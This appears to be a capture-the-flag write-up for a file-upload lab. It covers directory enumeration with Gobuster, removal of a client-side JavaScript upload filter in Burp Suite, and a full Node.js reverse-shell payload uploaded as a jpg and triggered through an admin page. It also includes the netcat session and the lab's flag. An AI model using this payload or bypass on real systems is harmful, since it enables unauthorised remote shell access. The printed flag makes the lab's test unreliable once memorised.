# steps to find the flag in http://jewel.uploadvulns.thm/
- uploaded a few files to and the file format acceptable appeared to be in jpeg,jpg

- ran Gobuster:
gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirb/common.txt -t 250 -x txt,php,js,html

Results:
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jewel.uploadvulns.thm/
[+] Method:                  GET
[+] Threads:                 250
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php,js
[+] Timeout:                 10s
===============================================================
2021/06/28 22:09:02 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 1238]
/ADMIN                (Status: 200) [Size: 1238]
/Admin                (Status: 200) [Size: 1238]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/content              (Status: 301) [Size: 181] [--> /content/]
/Content              (Status: 301) [Size: 181] [--> /Content/]
/modules              (Status: 301) [Size: 181] [--> /modules/]
                                                              

- Using Wappalyzer, the technology for the page appeared to show Node.js.  As noted in previous exercises, Open Burp Suite, opened Proxy tab, options, and deleted js from the intercept client requests.  Also captured the intercept in Burp Suite and removed the filters from js script

//Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
			//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
				setResponseMsg("Invalid file format", "red");
				return;	
			}
			//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			}


- created a file with a NodeJS payload and uploaded to http://jewel.uploadvulns.thm/

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


- Ran Gobuster for the content folder after uploading the shell
gobuster dir -u http://jewel.uploadvulns.thm/content/ -w UploadVulnsWordlist(2).txt -t 250 -x jpg
Results:
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jewel.uploadvulns.thm/content/
[+] Method:                  GET
[+] Threads:                 250
[+] Wordlist:                UploadVulnsWordlist(2).txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              jpg
[+] Timeout:                 10s
===============================================================
2021/06/29 00:27:11 Starting gobuster in directory enumeration mode
===============================================================
/ABG.jpg              (Status: 200) [Size: 380]
/ABH.jpg              (Status: 200) [Size: 705442]
/BSV.jpg              (Status: 200) [Size: 380]   
/FNL.jpg              (Status: 200) [Size: 380]   
/JUM.jpg              (Status: 200) [Size: 36767] 
/LLE.jpg              (Status: 200) [Size: 379]   
/LKQ.jpg              (Status: 200) [Size: 444808]
/NKG.jpg              (Status: 200) [Size: 380]   
/OJT.jpg              (Status: 200) [Size: 379]   
/PEF.jpg              (Status: 200) [Size: 6872]  
/PRB.jpg              (Status: 200) [Size: 380]   
/RSG.jpg              (Status: 200) [Size: 380]   
/SAD.jpg              (Status: 200) [Size: 247159]
Progress: 27712 / 35154 (78.83%)                 [ERROR] 2021/06/29 00:32:07 [!] context deadline exceeded (Client.Timeout or context cancellation while reading body)
/ULM.jpg              (Status: 200) [Size: 380]   
/VCM.jpg              (Status: 200) [Size: 36767] 
/YCJ.jpg              (Status: 200) [Size: 383]

- While listening to port 4242, navigated to http://jewel.uploadvulns.thm/admin, and executed ../content/LKQ.jpg to connect shell

nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.9.9.34] from (UNKNOWN) [10.10.229.82] 44182
pwd
/var/www/html
cd ..
pwd
/var/www
ls
flag.txt
html
cat flag.txt
THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}
